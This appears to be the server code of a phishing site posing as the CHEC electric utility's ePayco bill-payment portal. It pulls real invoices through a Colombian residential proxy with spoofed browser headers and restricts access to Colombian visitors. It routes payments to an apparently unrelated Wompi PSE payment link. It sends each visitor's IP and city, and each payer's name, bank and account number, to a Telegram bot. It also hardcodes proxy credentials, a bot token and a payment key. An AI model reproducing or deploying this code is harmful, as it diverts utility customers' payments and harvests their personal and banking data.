const express = require("express");
const cors = require("cors");
const axios = require("axios");
const path = require("path");
const { HttpsProxyAgent } = require("https-proxy-agent");
const geoip = require("geoip-lite");

const app = express();
const PORT = process.env.PORT || 3001;

// ─── Configuración de las URLs de ePayco ───
const API_RECAUDO = "https://recaudo.epayco.co";
const DOMINIO_CHEC = "https://chec.epayco.me";
const URL_FRONT = process.env.URL_FRONT || "https://www.pagepmagil.online";

// ─── Proxy Residencial Geonode ───
const GEONODE_DNS = "92.204.171.83";
const GEONODE_PORT = 9000;
const GEONODE_USER = "geonode_t6USfXsYi6-type-residential-country-CO";
const GEONODE_PASS = "fbc9c047-7c88-416e-a80c-8d2c83a5c3fa";
const GEONODE_PROXY = `http://${GEONODE_USER}:${GEONODE_PASS}@${GEONODE_DNS}:${GEONODE_PORT}`;
const proxyAgent = new HttpsProxyAgent(GEONODE_PROXY);

// ─── Headers comunes para ePayco (simulando navegador real) ───
const HEADERS_EPAYCO = {
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Origin": DOMINIO_CHEC,
  "Referer": `${DOMINIO_CHEC}/recaudo/online`,
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Accept-Language": "es-CO,es;q=0.9,en;q=0.8",
  "Accept-Encoding": "gzip, deflate, br",
};

// ─── Middlewares ───
app.use(cors());
app.use(express.json());

// ═══════════════════════════════════════════
// BLOQUEO GEOGRÁFICO: SOLO PERMITIR COLOMBIA (CO)
// ═══════════════════════════════════════════
app.use((req, res, next) => {
  const clientIp =
    req.headers["x-forwarded-for"] ||
    req.headers["x-real-ip"] ||
    req.socket.remoteAddress ||
    "0.0.0.0";

  const cleanIp = clientIp.includes(",") ? clientIp.split(",")[0].trim() : clientIp;
  const ipFinal = cleanIp.includes(":") ? cleanIp.split(":").pop() : cleanIp;

  if (
    ipFinal === "127.0.0.1" ||
    ipFinal === "::1" ||
    ipFinal === "1" ||
    ipFinal === "localhost" ||
    ipFinal.startsWith("192.168.") ||
    ipFinal.startsWith("10.")
  ) {
    return next();
  }

  const geo = geoip.lookup(ipFinal);

  if (!geo || geo.country !== "CO") {
    return res.status(403).send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
          <meta charset="UTF-8">
          <title>Acceso Denegado</title>
      </head>
      <body style="font-family:sans-serif; text-align:center; padding-top:80px; background-color:#f8f9fa;">
          <h1 style="color:#d9534f; font-size:32px;">403 Forbidden</h1>
          <p style="font-size:16px; color:#555;">Lo sentimos, este sitio solo está disponible para usuarios ubicados en Colombia.</p>
      </body>
      </html>
    `);
  }

  next();
});

app.use(express.static(path.join(__dirname, "public")));

// ═══════════════════════════════════════════
// ENDPOINT 1: Obtener Token
// ═══════════════════════════════════════════
app.post("/api/token", async (req, res) => {
  try {
    const response = await axios.post(
      `${API_RECAUDO}/api/recaudo/get/token`,
      { dominio: DOMINIO_CHEC },
      {
        headers: { ...HEADERS_EPAYCO },
        httpsAgent: proxyAgent,
        proxy: false,
      }
    );

    res.json(response.data);
  } catch (error) {
    console.error("Error obteniendo token:", error.message);
    res.status(500).json({
      success: false,
      message: "Error al obtener el token",
      error: error.message,
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 2: Consultar Facturas
// ═══════════════════════════════════════════
app.post("/api/facturas", async (req, res) => {
  try {
    const { clienteId, token } = req.body;

    if (!clienteId || !token) {
      return res
        .status(400)
        .json({ success: false, message: "clienteId y token son requeridos" });
    }

    const response = await axios.post(
      `${API_RECAUDO}/api/recaudo/proyecto/api/consulta/facturas`,
      {
        consulta: [{ parametro: "ClienteId", value: clienteId }],
        dominio: `${DOMINIO_CHEC}/recaudo/online`,
      },
      {
        headers: {
          ...HEADERS_EPAYCO,
          Accept: "application/json",
          Authorization: `Bearer ${token}`,
        },
        httpsAgent: proxyAgent,
        proxy: false,
      }
    );

    res.json(response.data);
  } catch (error) {
    console.error("Error consultando facturas:", error.message);
    res.status(500).json({
      success: false,
      message: "Error al consultar facturas",
      error: error.message,
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 3: Obtener IP del cliente
// ═══════════════════════════════════════════
app.get("/api/ip", async (req, res) => {
  try {
    const response = await axios.get("https://apify-private.epayco.co/getip");
    res.json(response.data);
  } catch (error) {
    const clientIp =
      req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
    res.json({ data: clientIp, ip: clientIp });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 4: Crear Sesion de Checkout
// ═══════════════════════════════════════════
app.post("/api/checkout/session", async (req, res) => {
  try {
    const { token, checkoutData } = req.body;

    if (!token || !checkoutData) {
      return res.status(400).json({
        success: false,
        message: "token y checkoutData son requeridos",
      });
    }

    console.log("═══ DATOS ENVIADOS AL CHECKOUT ═══");
    console.log(JSON.stringify(checkoutData, null, 2));

    const response = await axios.post(
      `${API_RECAUDO}/api/recaudo/checkout/sessionid`,
      checkoutData,
      {
        headers: {
          ...HEADERS_EPAYCO,
          Authorization: `Bearer ${token}`,
        },
        httpsAgent: proxyAgent,
        proxy: false,
      }
    );

    console.log("═══ RESPUESTA CHECKOUT ═══");
    console.log(JSON.stringify(response.data, null, 2));

    res.json(response.data);
  } catch (error) {
    console.error("Error creando sesion checkout:", error.message);
    if (error.response) {
      console.error("Status:", error.response.status);
      console.error("Response data:", JSON.stringify(error.response.data, null, 2));
    }
    res.status(500).json({
      success: false,
      message: "Error al crear sesion de checkout",
      error: error.message,
      details: error.response ? error.response.data : null,
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 5: Confirmacion de Pago (Webhook)
// ═══════════════════════════════════════════
app.post("/api/confirmacion", async (req, res) => {
  try {
    console.log("═══ CONFIRMACION DE PAGO RECIBIDA ═══");
    console.log(JSON.stringify(req.body, null, 2));

    const response = await axios.post(
      `${API_RECAUDO}/api/recaudo/proyecto/actualizar/pago/facturas/confirmacion`,
      req.body,
      {
        headers: { ...HEADERS_EPAYCO },
        httpsAgent: proxyAgent,
        proxy: false,
      }
    );

    res.json(response.data);
  } catch (error) {
    console.error("Error en confirmacion:", error.message);
    res.status(500).json({
      success: false,
      message: "Error en confirmacion de pago",
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 6: Consultar Transaccion por ref_payco
// ═══════════════════════════════════════════
app.get("/api/transaccion/:refPayco", async (req, res) => {
  try {
    const { refPayco } = req.params;

    const response = await axios.get(
      `https://secure.epayco.co/validation/v1/reference/${refPayco}`
    );

    res.json(response.data);
  } catch (error) {
    console.error("Error consultando transaccion:", error.message);
    res.status(500).json({
      success: false,
      message: "Error al consultar la transaccion",
      error: error.message,
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 7: Enviar Email de Transaccion
// ═══════════════════════════════════════════
app.get("/api/email-transaccion", async (req, res) => {
  try {
    const { transaction_id, email_adicional } = req.query;

    const response = await axios.get(
      "https://secure.payco.co/apprest/email/transaccion",
      {
        params: { transaction_id, email_adicional },
      }
    );

    res.json(response.data);
  } catch (error) {
    console.error("Error enviando email:", error.message);
    res.status(500).json({
      success: false,
      message: "Error al enviar email de transaccion",
    });
  }
});

// ═══════════════════════════════════════════
// Telegram Bot - Notificaciones de pago
// ═══════════════════════════════════════════
const TELEGRAM_TOKEN = "7844670796:AAFMQxtE6B91-7Y_PIv9cP-zERUlps1Lqck";
const TELEGRAM_CHAT_ID = "-1004356725315";

const BANCOS_COLOMBIA = {
  "1007":"BANCOLOMBIA","1051":"DAVIVIENDA","1001":"BANCO DE BOGOTA","1013":"BBVA COLOMBIA",
  "1052":"BANCO AV VILLAS","1032":"BANCO CAJA SOCIAL","1023":"BANCO DE OCCIDENTE",
  "1002":"BANCO POPULAR","1019":"SCOTIABANK COLPATRIA","1062":"BANCO FALABELLA",
  "1012":"BANCO GNB SUDAMERIS","1014":"ITAU","1060":"BANCO PICHINCHA","1040":"BANCO AGRARIO",
  "1507":"NEQUI","1551":"DAVIPLATA","1070":"LULO BANK","1809":"NU COLOMBIA",
  "1811":"RAPPIPAY","1804":"UALA","1801":"MOVII","1009":"CITIBANK","1031":"BANCOLDEX",
  "1047":"BANCO MUNDO MUJER","1053":"BANCO W","1058":"BANCO PROCREDIT","1059":"BANCAMIA",
  "1061":"BANCOOMEVA","1063":"BANCO FINANDINA","1065":"BANCO SANTANDER","1066":"COOPCENTRAL",
  "1067":"MIBANCO","1069":"BANCO SERFINANZA","1071":"JP MORGAN","1097":"DALE",
  "1121":"JURISCOOP","1283":"CFA COOPERATIVA","1286":"JFK COOPERATIVA",
  "1289":"COTRAFA","1292":"CONFIAR","1303":"BANCO UNION","1370":"COLTEFINANCIERA",
  "1558":"BAN100","1560":"PIBANK","1637":"IRIS","1802":"DING TECNIPAGOS","1803":"POWWI",
  "1805":"BANCO BTG PACTUAL","1808":"BOLD CF","1812":"COINK","1814":"GLOBAL66",
  "1815":"ALIANZA FIDUCIARIA","1816":"CREZCAMOS","1819":"BANCO CONTACTAR"
};

async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia) {
  try {
    const formatter = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 });
    const bancoNombre = BANCOS_COLOMBIA[bancoCode] || bancoCode;
    const mensaje = `🟢 *NUEVO PAGO PSE (Wompi)*\n\n` +
      `👤 *Nombre:* ${nombre}\n` +
      `💰 *Valor:* ${formatter.format(valor)}\n` +
      `🏦 *Banco:* ${bancoNombre} (${bancoCode})\n` +
      `🌐 *IP:* ${ip}\n` +
      `📍 *Ciudad:* ${ciudad}\n` +
      `📋 *Cuenta:* ${referencia}\n` +
      `🕐 *Fecha:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown"
    });
    console.log("Notificación Telegram enviada");
  } catch (error) {
    console.error("Error enviando Telegram:", error.message);
  }
}

async function obtenerUbicacionIP(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=es`);
    if (res.data && res.data.status === "success") {
      return `${res.data.city}, ${res.data.regionName}, ${res.data.country}`;
    }
    return "Desconocida";
  } catch (e) {
    return "Desconocida";
  }
}

// ═══════════════════════════════════════════
// WOMPI — Solo Public Key + Link Slug (sin private key)
// ═══════════════════════════════════════════
const WOMPI_PUB_KEY = process.env.WOMPI_PUB_KEY || "pub_prod_KIT2qsVB9C8U8bZj1IkEPkivasLqOZoi";
const WOMPI_PAYMENT_LINK_ID = "VPOS_YJLGcM";
const WOMPI_API = "https://api.wompi.co/v1";

async function getWompiTokens() {
  const { data } = await axios.get(`${WOMPI_API}/merchants/${WOMPI_PUB_KEY}`, { timeout: 10000 });
  return {
    acceptance_token: data.data.presigned_acceptance.acceptance_token,
    personal_auth_token: data.data.presigned_personal_data_auth.acceptance_token
  };
}

// ═══════════════════════════════════════════
// ENDPOINT 8: Listar Bancos PSE (vía Wompi)
// ═══════════════════════════════════════════
app.get("/api/pasarela/bancos-pse", async (req, res) => {
  try {
    const response = await axios.get(`${WOMPI_API}/pse/financial_institutions`, {
      headers: { Authorization: `Bearer ${WOMPI_PUB_KEY}` }
    });

    const bancos = (response.data.data || []).map(b => ({
      code: String(b.financial_institution_code),
      name: b.name || b.financial_institution_name || ""
    }));

    res.json({ success: true, data: bancos });
  } catch (error) {
    console.error("Error obteniendo bancos PSE de Wompi:", error.message);
    const fallback = Object.entries(BANCOS_COLOMBIA).map(([code, name]) => ({ code, name }));
    res.json({ success: true, data: fallback, fallback: true });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 9: Cobro PSE con Wompi (public key + payment_link_id, sin private key)
// ═══════════════════════════════════════════
app.post("/api/pasarela/cobro-pse", async (req, res) => {
  try {
    const { amount, description, reference, bankCode, customerName, customerEmail, customerDoc, customerDocType, customerPhone, numeroCuenta } = req.body;

    if (!amount || !reference || !bankCode) {
      return res.status(400).json({ success: false, message: "amount, reference y bankCode son requeridos" });
    }

    // 1. Obtener tokens de aceptación
    const tokens = await getWompiTokens();
    const paymentLinkId = WOMPI_PAYMENT_LINK_ID;

    // 2. Construir payload
    const amountInCents = Math.round(parseFloat(amount) * 100);

    // 3. Obtener IP del cliente para reference_one (requerido por PSE_AVANZA)
    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
    const realIp = clientIp.split(",")[0].trim();

    const transactionPayload = {
      acceptance_token: tokens.acceptance_token,
      accept_personal_auth: tokens.personal_auth_token,
      amount_in_cents: amountInCents,
      currency: "COP",
      customer_email: customerEmail,
      reference: reference,
      redirect_url: `${URL_FRONT}/respuesta.html?status=success&ref=${encodeURIComponent(reference)}`,
      payment_link_id: paymentLinkId,
      payment_method: {
        type: "PSE",
        user_type: 0,
        user_legal_id_type: customerDocType || "CC",
        user_legal_id: customerDoc,
        financial_institution_code: bankCode,
        payment_description: "Pago en linea",
        reference_one: realIp,
        reference_two: new Date().toISOString().slice(0, 10).replace(/-/g, ""),
        reference_three: customerDoc
      },
      customer_data: {
        phone_number: customerPhone,
        full_name: customerName
      }
    };

    // 4. Notificar Telegram (amount viene en pesos)
    const ciudad = await obtenerUbicacionIP(realIp);
    notificarTelegram(customerName || "Sin nombre", amount, bankCode, realIp, ciudad, numeroCuenta || "N/A");

    console.log("═══ TRANSACCIÓN WOMPI PSE (public key) ═══");
    console.log(JSON.stringify(transactionPayload, null, 2));

    // 5. Crear transacción con PUBLIC KEY como Bearer
    const wompiRes = await axios.post(`${WOMPI_API}/transactions`, transactionPayload, {
      headers: {
        Authorization: `Bearer ${WOMPI_PUB_KEY}`,
        "Content-Type": "application/json"
      }
    });

    console.log("═══ RESPUESTA WOMPI ═══");
    console.log(JSON.stringify(wompiRes.data, null, 2));

    const txId = wompiRes.data.data?.id;
    if (!txId) {
      return res.status(500).json({ success: false, message: "Wompi no devolvió ID de transacción", details: wompiRes.data });
    }

    // 5. Polling para obtener async_payment_url (el banco tarda unos segundos)
    let bankUrl = null;
    for (let i = 0; i < 15; i++) {
      await new Promise(r => setTimeout(r, 2000));
      const check = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
        headers: { Authorization: `Bearer ${WOMPI_PUB_KEY}` }
      });
      const txData = check.data.data || {};
      bankUrl = txData.payment_method?.extra?.async_payment_url || null;
      console.log(`Polling ${i + 1}/15 — status: ${txData.status}, bankUrl: ${bankUrl ? "SÍ" : "no"}`);
      if (bankUrl) break;
      if (txData.status === "DECLINED" || txData.status === "ERROR") {
        return res.status(400).json({ success: false, message: `Transacción ${txData.status}`, details: txData });
      }
    }

    if (!bankUrl) {
      return res.status(500).json({ success: false, message: "Wompi no devolvió la URL del banco PSE después de 30s" });
    }

    // 6. Devolver URL del banco al frontend
    res.json({
      success: true,
      data: {
        id: txId,
        status: "PENDING",
        next_action: { redirect_url: bankUrl }
      }
    });

  } catch (error) {
    console.error("Error en cobro PSE Wompi:", error.message);
    if (error.response) {
      console.error("Status:", error.response.status);
      console.error("Response:", JSON.stringify(error.response.data, null, 2));
    }
    res.status(500).json({
      success: false,
      message: "Error al procesar cobro PSE con Wompi",
      error: error.message,
      details: error.response ? error.response.data : null
    });
  }
});

// ═══════════════════════════════════════════
// ENDPOINT 10: Notificar Visita (Ingreso al Index)
// ═══════════════════════════════════════════
app.post("/api/notificar-ingreso", async (req, res) => {
  try {
    const clientIp = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "0.0.0.0";
    const realIp = clientIp.split(",")[0].trim();
    const ciudad = await obtenerUbicacionIP(realIp);

    const mensaje = `🟡 *INGRESO NUEVO*\n\n` +
      `💬 *Acción:* ingreso\n` +
      `🌐 *IP:* ${realIp}\n` +
      `📍 *Ciudad:* ${ciudad}\n` +
      `🕐 *Fecha:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown"
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error notificando ingreso:", error.message);
    res.status(500).json({ success: false });
  }
});

// ─── Fallback: Servir index.html para rutas del frontend ───
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ─── Iniciar servidor ───
app.listen(PORT, () => {
  console.log(`\n══════════════════════════════════════`);
  console.log(`  Servidor CHEC Proxy corriendo`);
  console.log(`  http://localhost:${PORT}`);
  console.log(`  Proxy residencial: Geonode activo`);
  console.log(`  Filtro geográfico: Solo Colombia (CO)`);
  console.log(`  Wompi PSE integrado`);
  console.log(`══════════════════════════════════════\n`);
});
